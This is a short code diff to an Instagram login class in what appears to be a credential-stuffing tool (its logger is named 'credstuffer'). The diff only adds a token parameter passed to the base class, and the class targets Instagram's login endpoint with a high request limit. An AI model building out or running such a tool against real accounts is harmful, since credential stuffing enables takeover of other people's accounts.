@@ -16,13 +16,13 @@ class Instagram(UserAccount):
             instagram.login(password=password)
     """
 
-    def __init__(self, max_requests=10000, notify=None, **kwargs):
+    def __init__(self, max_requests=10000, notify=None, token=None, **kwargs):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Instagram')
         self.name = 'Instagram'
 
         # init base class
-        super().__init__(name=self.name, notify=notify, **kwargs)
+        super().__init__(name=self.name, notify=notify, token=token, **kwargs)
 
         self.url_login = "https://www.instagram.com/accounts/login/ajax/"
 
